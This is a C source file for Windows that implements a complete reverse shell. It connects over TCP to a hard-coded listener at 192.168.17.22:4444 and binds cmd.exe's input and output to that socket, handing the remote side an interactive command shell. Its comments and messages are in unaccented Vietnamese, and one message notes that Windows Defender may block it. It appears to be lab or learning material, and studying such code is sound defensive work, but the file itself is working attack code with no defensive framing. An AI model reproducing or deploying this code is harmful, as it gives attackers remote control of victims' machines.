#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32.lib")

void PrintError(const char* msg) {
    printf("[-] %s. Error: %d\n", msg, WSAGetLastError());
}

int main() {
    WSADATA wsa;
    SOCKET wSock;
    struct sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    const char* ip = "192.168.17.22";
    int port = 4444;

    // 1. Khoi tao Winsock
    printf("[*] Dang khoi tao Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[-] WSAStartup that bai. Error: %d\n", GetLastError());
        return 1;
    }

    // 2. Tao Socket
    printf("[*] Dang tao socket...\n");
    wSock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (wSock == INVALID_SOCKET) {
        PrintError("Tao Socket that bai");
        WSACleanup();
        return 1;
    }

    // 3. Cau hinh Server
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    // 4. Ket noi
    printf("[*] Dang ket noi toi %s:%d...\n", ip, port);
    if (WSAConnect(wSock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        PrintError("Ket noi den Listener that bai");
        closesocket(wSock);
        WSACleanup();
        return 1;
    }
    printf("[+] Ket noi thanh cong!\n");

    // 5. Thiet lap Handle Inheritance
    if (!SetHandleInformation((HANDLE)wSock, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
        printf("[-] Khong the thiet lap Handle Inheritance. Error: %d\n", GetLastError());
    }

    // 6. Khoi tao STARTUPINFOA
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)wSock;
    si.hStdOutput = (HANDLE)wSock;
    si.hStdError = (HANDLE)wSock;

    // 7. Tao tien trinh CMD
    char cmd[] = "C:\\Windows\\System32\\cmd.exe";
    printf("[*] Dang khoi tao cmd.exe...\n");

    if (CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("[+] Tien trinh CMD da chay (PID: %d). Dang doi tuong tac...\n", pi.dwProcessId);

        // Cho cho den khi cmd.exe ket thuc
        WaitForSingleObject(pi.hProcess, INFINITE);

        printf("[*] Tien trinh CMD da dong.\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        printf("[-] CreateProcessA that bai! Error code: %d\n", GetLastError());
        printf("[!] Goi y: Neu error = 5, Windows Defender da chan ban.\n");
    }

    // Don dep
    closesocket(wSock);
    WSACleanup();
    printf("[*] Chuong trinh ket thuc.\n");

    // Dung man hinh de xem log neu chay truc tiep file exe
    system("pause");
    return 0;
}